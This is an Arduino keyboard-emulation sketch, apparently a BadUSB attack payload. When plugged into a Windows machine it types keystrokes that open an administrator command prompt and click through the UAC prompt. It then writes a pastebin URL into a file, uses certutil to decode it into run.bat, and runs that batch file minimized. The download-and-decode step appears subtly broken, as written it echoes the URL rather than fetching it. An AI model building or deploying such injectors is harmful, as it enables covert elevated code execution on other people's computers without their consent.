#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();



  delay(400);

  typeKey(KEY_LEFT_GUI);

  delay(400);

  Keyboard.print("cmd");

  Keyboard.press(KEY_LEFT_CTRL);
  delay(400);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(400);
  Keyboard.press(KEY_RETURN);
  delay(800);
  Keyboard.releaseAll();

  delay(800);

  Keyboard.press(KEY_LEFT_ARROW);
  delay(400);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.press(KEY_RETURN);

  delay(400);
  Keyboard.releaseAll();

  Keyboard.print("cd / & mkdir win & cd win");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("echo https://pastebin.com/raw/D1QycvS6 > base.txt");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("certutil -decode base.txt run.bat");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("START /MIN run.bat");

  typeKey(KEY_RETURN);

  delay(11400);


  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
